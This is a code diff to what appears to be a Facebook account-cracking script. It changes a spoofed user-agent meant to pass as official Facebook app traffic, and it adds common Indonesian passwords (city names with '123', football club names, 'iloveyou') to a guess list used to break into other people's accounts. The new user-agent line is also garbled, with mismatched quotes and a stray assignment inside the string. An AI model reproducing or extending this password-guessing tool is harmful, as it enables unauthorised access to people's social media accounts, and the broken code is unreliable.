@@ -112,7 +112,7 @@ def whoami(kaya,kontol):
 def ua_krek():
 	rr = random.randint
 	model = random.choice(['RMX3286','RMX3491'])
-	ua = (f"Dalvik/2.1.0 (Linux; U; Android {str(rr(9,13))}; Vision3 Build/MRA58K) [FBAN/MessengerLite;FBAV/{str(rr(40,375))}.309.0.0.8.61;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/434647565;FBCR/AXIS;FBMF/Vision;FBBD/Vision;FBDV/Vision3;FBSV/{str(rr(9,13))};FBCA/arm64-v8a:null;FBDM/"+"{density=2.54375,width=720,height=1600};]")
+	ua = (f"'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'ua_vivo = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;])
 	return ua
 ###-----------------[]-----------------###
 def licensi():
@@ -529,6 +529,21 @@ class Crack:
 								pwx.append("katasandi")
 								pwx.append("freefire")
 								pwx.append("freefire123")
+								pwx.append("bandung123")
+								pwx.append("jakarta123")
+								pwx.append("surabaya123")
+								pwx.append("doraemon")
+								pwx.append("santri123")
+								pwx.append("pasuruan123")
+								pwx.append("malang123")
+								pwx.append("qwerty123")
+								pwx.append("indonesia")
+								pwx.append("arema1987")
+								pwx.append("persija123")
+								pwx.append("persib123")
+								pwx.append("iloveyou")
+								
+
 						else:
 							if len(depan)<3:
 								pwx.append(nama)
